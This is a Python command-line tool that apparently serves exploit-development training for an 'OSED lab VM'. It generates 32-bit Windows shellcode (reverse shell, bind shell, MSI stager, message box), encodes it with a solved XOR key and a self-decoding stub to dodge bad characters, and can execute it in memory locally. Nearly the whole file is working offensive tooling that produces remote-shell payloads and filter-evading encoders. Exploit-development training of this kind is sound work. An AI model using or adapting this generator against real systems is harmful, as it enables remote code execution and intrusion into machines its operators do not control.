#!/usr/bin/python3
import sys
import argparse
import ctypes
import importlib.util
import struct
import re
import keystone as ks
from colorama import init, Fore, Style
from shellcode.bind_shellcode import bind_shellcode
from shellcode.msi_shellcode import msi_shellcode
from shellcode.msg_box_shellcode import msg_box
from shellcode.rev_shellcode import rev_shellcode

# init colorama
init()


# format utils
def visible_len(s: str) -> int:
    # Return the printable length of a string without ANSI escape codes.
    ansi_escape = re.compile(r"\x1b\[[0-9;]*m")
    return len(ansi_escape.sub("", s))


def pad_ansi(s: str, width: int) -> str:
    # Pad a colored string to a visible width.
    pad = width - visible_len(s)
    if pad > 0:
        return s + " " * pad
    return s


def parse_badchars_string(s: str) -> list[int]:
    s = s.replace(" ", "").lower()
    if not s:
        return []

    if len(s) % 4 != 0 or not all(
        s[i : i + 2] == "\\x" for i in range(0, len(s), 4)
    ):
        raise ValueError

    return [int(s[i + 2 : i + 4], 16) for i in range(0, len(s), 4)]


def parse_key_arg(key_arg):
    key = int(key_arg, 16) if key_arg.startswith("0x") else int(key_arg)
    return key & 0xFFFFFFFF


def get_aligned_payload(payload_bytes):
    payload_aligned = bytearray(payload_bytes)
    while len(payload_aligned) % 4 != 0:
        payload_aligned.append(0x90)

    return payload_aligned


def encode_payload_xor(payload_bytes, key):
    payload_aligned = get_aligned_payload(payload_bytes)

    encoded_payload = bytearray()
    for i in range(0, len(payload_aligned), 4):
        block = struct.unpack("<I", payload_aligned[i : i + 4])[0]
        encoded_payload += struct.pack("<I", block ^ key)

    return encoded_payload


def solve_xor_key(payload_bytes, bad_bytes, initial_key):
    payload_aligned = get_aligned_payload(payload_bytes)
    bad_set = set(bad_bytes)
    key_bytes = []
    lane_stats = []

    for lane in range(4):
        forbidden = set(bad_set)
        for payload_byte in payload_aligned[lane::4]:
            for bad_byte in bad_set:
                forbidden.add(payload_byte ^ bad_byte)

        initial_byte = (initial_key >> (lane * 8)) & 0xFF
        candidates = [
            (initial_byte + offset) & 0xFF
            for offset in range(256)
            if ((initial_byte + offset) & 0xFF) not in forbidden
        ]

        lane_stats.append((lane, len(candidates), len(forbidden)))
        if not candidates:
            return None, lane_stats

        key_bytes.append(candidates[0])

    return int.from_bytes(bytes(key_bytes), "little"), lane_stats


def assemble_xor_decoder(payload_len, key, ks_engine):
    aligned_len = payload_len
    while aligned_len % 4 != 0:
        aligned_len += 1

    num_blocks = aligned_len // 4
    asm = [
        "   start:            ",
        "       jmp get_addr ;",
        "   decode:           ",
        "       pop edi      ;",
        "       xor ecx, ecx ;",
        f"      mov cl, {num_blocks} ;",
        "   loop_xor:         ",
        # decode from back to front
        f"      xor dword ptr [edi + ecx*4 - 4], {hex(key)} ;",
        "       loop loop_xor ;",
        "       jmp edi      ;",
        "   get_addr:         ",
        "       call decode  ;",
    ]

    assembled_decoder_stub, _ = ks_engine.asm("\n".join(asm))
    return bytearray(assembled_decoder_stub)


def format_python_bytes(var_name, data):
    lines = [f'{var_name} =  b""']
    for idx in range(0, len(data), 12):
        block = data[idx : idx + 12]
        block_hex = "".join("\\x{0:02x}".format(enc) for enc in block)
        lines.append(f'{var_name} += b"{block_hex}"')

    return "\n".join(lines)


def find_decoder_probe_key(bad_bytes):
    for byte in range(256):
        if byte not in bad_bytes:
            return int.from_bytes(bytes([byte]) * 4, "little")

    raise ValueError("no byte available for decoder probe key")


def abort_on_bad_chars(data, bad_chars, warning, abort_message):
    if not any(byte in bad_chars for byte in data):
        return

    print(f"\n{Fore.RED}[!] {warning}{Style.RESET_ALL}")
    check_and_disassemble(data, bad_chars)
    print(f"\n{Fore.RED}[!] {abort_message}{Style.RESET_ALL}")
    sys.exit(1)


def load_custom_shellcode(path):
    """Load a user payload module and return its standard builder function."""
    spec = importlib.util.spec_from_file_location("custom_shellcode", path)
    if spec is None or spec.loader is None:
        raise ValueError(f"could not load custom shellcode file: {path}")

    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    builder = getattr(module, "shellcode", None)
    if not callable(builder):
        raise ValueError(
            f"custom shellcode file {path!r} must define a callable shellcode()"
        )
    return builder


def build_encoded_shellcode(payload, bad_chars, initial_key, ks_engine):
    original_bad_count = sum(byte in bad_chars for byte in payload)
    print(f"[*] Original shellcode bad-byte count: {original_bad_count}")

    if bad_chars:
        try:
            probe_key = find_decoder_probe_key(bad_chars)
            decoder_probe = assemble_xor_decoder(
                len(payload), probe_key, ks_engine
            )
        except Exception as error:
            print(
                f"{Fore.RED}[!] Error compiling decoder stub: {error}"
                f"{Style.RESET_ALL}"
            )
            sys.exit(1)

        abort_on_bad_chars(
            decoder_probe,
            bad_chars,
            "FATAL: Decoder stub contains bad chars before key search.",
            "Shellcode generation aborted due to bad chars in decoder stub.",
        )
        print(
            f"[+] {Fore.GREEN}Decoder stub is clean; no bad chars found."
            f"{Style.RESET_ALL}"
        )

    print(
        f"[*] Solving for a clean XOR key starting near {hex(initial_key)}..."
    )
    solved_key, lane_stats = solve_xor_key(payload, bad_chars, initial_key)
    for lane, candidate_count, forbidden_count in lane_stats:
        print(
            f"[*] Key byte lane {lane}: {candidate_count} candidates "
            f"({forbidden_count} forbidden)"
        )

    if solved_key is None:
        print(
            f"\n{Fore.RED}[!] FATAL: Could not solve a single clean XOR key "
            f"for this bad-char set.{Style.RESET_ALL}"
        )
        sys.exit(1)

    decoder = assemble_xor_decoder(len(payload), solved_key, ks_engine)
    abort_on_bad_chars(
        decoder,
        bad_chars,
        "WARNING: Decoder contains bad chars!",
        "Shellcode generation aborted due to bad chars in decoder.",
    )

    encoded_payload = encode_payload_xor(payload, solved_key)
    abort_on_bad_chars(
        encoded_payload,
        bad_chars,
        "WARNING: Encoded shellcode contains bad chars!",
        "Shellcode generation aborted due to bad chars in encoded shellcode.",
    )

    return solved_key, decoder, encoded_payload


def print_encoding_success(solved_key):
    print(f"\n[+] {Fore.GREEN}SUCCESS!{Style.RESET_ALL}")
    print(
        f"[+] Solved clean key: {Fore.YELLOW}{hex(solved_key)}{Style.RESET_ALL}"
    )
    print(
        f"[+] {Fore.GREEN}Decoder is clean; no bad chars found."
        f"{Style.RESET_ALL}"
    )
    print(
        f"[+] {Fore.GREEN}Encoded shellcode is clean; no bad chars found."
        f"{Style.RESET_ALL}"
    )
    print(
        f"\n{Fore.YELLOW}[!] WARNING: ensure `pop edi` pulls "
        "an aligned address. Add NOPs if necessary!"
    )
    print(
        f"{Fore.YELLOW}[!] WARNING: decoder modifies destination buffer "
        "in-place; WriteProcessMemory may fail if destination is "
        f"not writable.{Style.RESET_ALL}"
    )


def check_and_disassemble(encoding, bad_bytes):
    def iter_bad_hits(instructions):
        for idx, ins in enumerate(instructions):
            hit_offsets = [
                (ins.address + byte_offset, byte)
                for byte_offset, byte in enumerate(ins.bytes)
                if byte in bad_bytes
            ]
            if hit_offsets:
                yield idx, ins, hit_offsets

    def render_instruction(ins, is_bad_ins):
        byte_str = " ".join(
            (
                f"{Fore.RED}{byte:02x}{Style.RESET_ALL}"
                if byte in bad_bytes
                else (
                    f"{Fore.WHITE}{byte:02x}{Style.RESET_ALL}"
                    if is_bad_ins
                    else f"{Fore.LIGHTBLACK_EX}{byte:02x}{Style.RESET_ALL}"
                )
            )
            for byte in ins.bytes
        )
        padded_bytes = pad_ansi(byte_str, 24)
        if is_bad_ins:
            addr_str = f"{Fore.YELLOW}0x{ins.address:<4x}{Style.RESET_ALL}"
            mnemonic_str = (
                f"{Fore.RED}{Style.BRIGHT}{ins.mnemonic} {ins.op_str}"
                f"{Style.RESET_ALL}"
            )
            arrow = f"{Fore.RED}<--- ERROR{Style.RESET_ALL}"
        else:
            addr_str = f"{Fore.LIGHTBLACK_EX}0x{ins.address:<4x}{Style.RESET_ALL}"
            mnemonic_str = (
                f"{Fore.LIGHTBLACK_EX}{ins.mnemonic} {ins.op_str}"
                f"{Style.RESET_ALL}"
            )
            arrow = ""
        return f"{addr_str} {padded_bytes}  {mnemonic_str} {arrow}"

    print(
        f"\n[!] {Fore.RED}BAD CHARACTERS DETECTED! "
        f"Analyzing context...{Style.RESET_ALL}\n"
    )
    bytecode = bytes(encoding)
    bad_offsets = [
        (offset, byte)
        for offset, byte in enumerate(bytecode)
        if byte in bad_bytes
    ]

    try:
        from capstone import Cs, CS_ARCH_X86, CS_MODE_32
    except (ImportError, OSError) as error:
        print(
            f"{Fore.YELLOW}[!] Capstone unavailable: {error}"
            f"{Style.RESET_ALL}"
        )
        print("[!] Showing bad-character byte offsets without disassembly:")
        for offset, byte in bad_offsets:
            print(f"    0x{offset:04x}: {byte:02x}")
        return

    md = Cs(CS_ARCH_X86, CS_MODE_32)
    instructions = list(md.disasm(bytecode, 0x00))
    bad_instruction_hits = list(iter_bad_hits(instructions))
    bad_indices = {idx for idx, _, _ in bad_instruction_hits}

    if not bad_indices:
        print("[!] Capstone could not map the offending bytes to decoded instructions.")
        print("[!] Full bad-byte offset list:")
        for offset, byte in bad_offsets:
            print(f"    0x{offset:04x}: 0x{byte:02x}")
        return  # Should not happen if we are here

    print("[!] Bad-byte hits:")
    for _, ins, hit_offsets in bad_instruction_hits:
        hit_summary = ", ".join(
            f"0x{offset:04x}=0x{byte:02x}" for offset, byte in hit_offsets
        )
        print(
            f"    0x{ins.address:04x}: {ins.mnemonic} {ins.op_str}"
            f"    [{hit_summary}]"
        )

    print("\n[!] Full bad-byte offset list:")
    for offset, byte in bad_offsets:
        print(f"    0x{offset:04x}: 0x{byte:02x}")

    context_size = 3
    lines_to_show = {
        line_idx
        for bad_idx in bad_indices
        for line_idx in range(
            max(0, bad_idx - context_size),
            min(len(instructions), bad_idx + context_size + 1),
        )
    }
    sorted_lines = sorted(lines_to_show)

    last_line_idx = -1
    for idx in sorted_lines:
        if last_line_idx != -1 and idx > last_line_idx + 1:
            print(
                f"{Style.DIM}   ... [SKIPPING "
                f"{idx - last_line_idx - 1} INSTRUCTIONS] ..."
                f"{Style.RESET_ALL}"
            )
        print(render_instruction(instructions[idx], idx in bad_indices))
        last_line_idx = idx

    print(
        f"\n[!] {Fore.RED}Fix marked instructions to proceed.{Style.RESET_ALL}"
    )


def main(args):
    bad_bytes = []
    if args.bad_chars:
        try:
            bad_bytes = parse_badchars_string(args.bad_chars)
        except ValueError:
            print(
                f"{Fore.RED}[!] Error parsing bad chars. Use string format "
                f'(e.g. -b "\\x00\\x0a\\xff"){Style.RESET_ALL}'
            )
            sys.exit(1)

    if args.custom:
        try:
            custom_builder = load_custom_shellcode(args.custom)
            shellcode_asm = custom_builder(
                args.lhost, args.lport, args.debug_break, bad_bytes
            )
        except Exception as error:
            print(f"{Fore.RED}[!] Error loading custom shellcode: {error}{Style.RESET_ALL}")
            sys.exit(1)
    elif args.msi:
        shellcode_asm = msi_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)
    elif args.messagebox:
        shellcode_asm = msg_box(args.mb_header, args.mb_text, args.debug_break, bad_bytes)
    elif args.bind:
        shellcode_asm = bind_shellcode(args.lport, args.debug_break, bad_bytes)
    else:
        shellcode_asm = rev_shellcode(args.lhost, args.lport, args.debug_break, bad_bytes)

    if args.show_asm:
      print(shellcode_asm)

    print("[*] Compiling payload with Keystone...")

    eng = ks.Ks(ks.KS_ARCH_X86, ks.KS_MODE_32)
    try:
        encoding, count = eng.asm(shellcode_asm)
    except ks.KsError as e:
        print(f"{Fore.RED}[!] Error compiling shellcode: {e}{Style.RESET_ALL}")
        sys.exit(1)

    if args.key:
        initial_key = parse_key_arg(args.key)
        solved_key, decoder, encoded_shellcode = build_encoded_shellcode(
            encoding, bad_bytes, initial_key, eng
        )
        final_shellcode = decoder + encoded_shellcode
        print_encoding_success(solved_key)
        final_hex = "\n\n".join(
            [
                format_python_bytes("decoder", decoder),
                format_python_bytes("shellcode", encoded_shellcode),
                format_python_bytes("orig", encoding),
            ]
        )
    else:
        final_shellcode = encoding
        abort_on_bad_chars(
            final_shellcode,
            bad_bytes,
            "WARNING: Final shellcode still contains bad chars!",
            "Shellcode generation aborted due to bad chars.",
        )
        final_hex = format_python_bytes("shellcode", final_shellcode)

    print(f"\n[+] {Fore.GREEN}Shellcode created successfully!{Style.RESET_ALL}")
    print(f"[=]   Payload len:   {len(encoding)} bytes (0x{len(encoding):x})")
    if args.key:
        print(f"[=]   Decoder len:   {len(decoder)} bytes (0x{len(decoder):x})")
        print(
            f"[=]   Encoded len:   {len(encoded_shellcode)} bytes "
            f"(0x{len(encoded_shellcode):x})"
        )
        print(
            f"[=]   Combined len:  {len(decoder) + len(encoded_shellcode)} "
            f"bytes (0x{len(decoder) + len(encoded_shellcode):x})"
        )
    else:
        print(
            f"[=]   Total len:     {len(final_shellcode)} bytes "
            f"(0x{len(final_shellcode):x})"
        )
    endpoint_host = "0.0.0.0" if args.bind else args.lhost
    print(f"[=]   LHOST/LPORT:   {endpoint_host}:{args.lport}")

    print("\n" + final_hex + "\n")

    if args.store_shellcode:
        with open("shellcode.bin", "wb") as shellcode_file:
            shellcode_file.write(bytes(final_shellcode))
        print("[=]   Wrote shellcode.bin")

    # debug
    if args.test_shellcode:
        if (struct.calcsize("P") * 8) == 32:
            print("[*] Starting local test (VirtualAlloc + CreateThread)...")
            packed_shellcode = bytearray(final_shellcode)

            # (0x40 = PAGE_EXECUTE_READWRITE)
            ptr = ctypes.windll.kernel32.VirtualAlloc(
                ctypes.c_int(0),
                ctypes.c_int(len(packed_shellcode)),
                ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
                ctypes.c_int(0x40),
            )

            buf = (ctypes.c_char * len(packed_shellcode)).from_buffer(
                packed_shellcode
            )
            ctypes.windll.kernel32.RtlMoveMemory(
                ctypes.c_int(ptr), buf, ctypes.c_int(len(packed_shellcode))
            )

            print(f"[+] Shellcode mapped at: {hex(ptr)}")
            input("[?] Press ENTER to execute...")

            ht = ctypes.windll.kernel32.CreateThread(
                ctypes.c_int(0),
                0,
                ctypes.c_int(ptr),
                0,
                0,
                ctypes.pointer(ctypes.c_int(0)),
            )
            ctypes.windll.kernel32.WaitForSingleObject(
                ctypes.c_int(ht), ctypes.c_int(-1)
            )
        else:
            print(
                f"{Fore.YELLOW}[!] Local test skipped: system is not x86 "
                f"(32-bit).{Style.RESET_ALL}"
            )


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Creates shellcodes compatible with the OSED lab VM"
    )

    parser.add_argument(
        "-l",
        "--lhost",
        help="listening attacker system (default: 127.0.0.1)",
        default="127.0.0.1",
    )
    parser.add_argument(
        "-p",
        "--lport",
        help="listening port of the attacker system (default: 4444)",
        default="4444",
    )
    parser.add_argument(
        "-b",
        "--bad-chars",
        help="bad chars string in format \"\\x00\" (default: empty)",
        default="",
    )
    parser.add_argument(
        "-m",
        "--msi",
        help="use an msf msi exploit stager (short)",
        action="store_true",
    )
    parser.add_argument(
        "--bind", help="create a bind shell", action="store_true"
    )
    parser.add_argument(
        "--messagebox", help="create a message box payload", action="store_true"
    )
    parser.add_argument(
        "--custom",
        metavar="PATH",
        help=(
            "load a custom Python payload module; it must define "
            "shellcode(lhost, lport, breakpoint=0, bad_bytes=None)"
        ),
    )
    parser.add_argument("--mb-header", default="WARNING!", help="message box header text")
    parser.add_argument("--mb-text", default="You have been pwned", help="message box text")
    parser.add_argument(
        "-k",
        "--key",
        help=(
            "encode shellcode with key and prepend decoder stub "
            "(default: 0x12341234)"
        ),
        const="0x12341234",
        nargs="?",
    )
    parser.add_argument("--show-asm", help="Shows the full assembly", action="store_true")
    parser.add_argument(
        "-d",
        "--debug-break",
        help="add a software breakpoint as the first shellcode instruction",
        action="store_true",
    )
    parser.add_argument(
        "-t",
        "--test-shellcode",
        help="test the shellcode on the system",
        action="store_true",
    )
    parser.add_argument(
        "-s",
        "--store-shellcode",
        help="store the shellcode in binary format in the file shellcode.bin",
        action="store_true",
    )

    args = parser.parse_args()
    main(args)
